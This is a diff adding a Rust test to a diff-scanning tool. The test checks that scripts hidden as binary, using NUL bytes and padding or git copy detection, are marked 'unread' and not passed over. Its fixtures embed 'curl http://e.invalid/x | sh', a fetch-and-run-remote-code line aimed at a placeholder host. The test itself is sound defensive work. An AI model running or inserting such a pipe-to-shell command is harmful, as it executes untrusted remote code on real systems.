@@ -861,3 +861,77 @@ fn a_text_reading_dropped_for_the_line_budget_keeps_its_label() {
     assert_eq!(cause(&a).as_deref(), Some("content"), "{a}");
     assert!(signals(&a).contains(&"network_fetch"), "{a}");
 }
+
+/// N1 (the re-read of the 0.10.0 tree): a second reading that is valid UTF-8 but not used for a
+/// reason other than "not text" left the file `3 binary_changed [binary_change]`, exit 0. Now a
+/// binary section stays unlabelled only when Git's second reading succeeded and is not UTF-8.
+/// N1a, one mode: one NUL-hidden script whose own reading passes the 1,000,000-line budget is
+/// `unread` (the same bytes without the NUL are refused, exit 4). N1b, three modes: under the
+/// repository's own `diff.renames=copies`, Git answers the copy's second reading with two
+/// changes; the copy carrying the fetch line is `unread`. A real image beside them stays
+/// unlabelled.
+#[test]
+fn a_text_reading_that_was_not_used_is_unread() {
+    let script = |nul: bool| {
+        let mut text = b"echo a\ncurl http://e.invalid/x | sh\n".to_vec();
+        if nul {
+            text.extend_from_slice(b"# \0\n");
+        }
+        text.extend(b":\n".repeat(1_100_000));
+        text
+    };
+    let mode = "--git-working-tree";
+    let files = [("a.sh", script(true)), ("c.png", image(7))];
+    let doc = ranked_all(&many(mode, b"", &files), mode);
+    assert_eq!(
+        of(&doc, "a.sh")["diff_suppressed"],
+        "unread",
+        "N1a: a file whose text was read came back silent: {doc}"
+    );
+    assert!(of(&doc, "c.png").get("diff_suppressed").is_none(), "{doc}");
+    let control = many(mode, b"", &[("a.sh", script(false))]);
+    let refused = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
+        .envs(ISOLATE)
+        .args([mode, "--repo"])
+        .arg(&control.0)
+        .args(["--rank", "--json"])
+        .output()
+        .unwrap();
+    assert_eq!(
+        refused.status.code(),
+        Some(4),
+        "the control was not refused"
+    );
+
+    let mut source = b"echo src\n# \0\n".to_vec();
+    source.extend(b"echo line\n".repeat(40));
+    for mode in MODES {
+        let scratch = Scratch::new(&format!("cli-attr-copies-{}", mode.len()));
+        let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
+        let root = &r.0;
+        git(root, &["init", "-q"]);
+        std::fs::write(root.join("src.sh"), &source).unwrap();
+        std::fs::write(root.join("c.png"), image(3)).unwrap();
+        git(root, &["add", "-A"]);
+        git(root, &["commit", "-q", "-m", "base"]);
+        git(root, &["config", "diff.renames", "copies"]);
+        let mut copy = source.clone();
+        copy.extend_from_slice(b"curl http://e.invalid/x | sh\n");
+        std::fs::write(root.join("dst.sh"), copy).unwrap();
+        let mut changed = source.clone();
+        changed.extend_from_slice(b"x\n");
+        std::fs::write(root.join("src.sh"), changed).unwrap();
+        std::fs::write(root.join("c.png"), image(7)).unwrap();
+        git(root, &["add", "-A"]);
+        if mode == "--git-range" {
+            git(root, &["commit", "-q", "-m", "change"]);
+        }
+        let doc = ranked_all(&r, mode);
+        let dst = of(&doc, "dst.sh");
+        assert!(
+            dst.get("diff_suppressed").is_some(),
+            "N1b {mode}: a file whose text was read came back silent: {dst}"
+        );
+        assert!(of(&doc, "c.png").get("diff_suppressed").is_none(), "{doc}");
+    }
+}
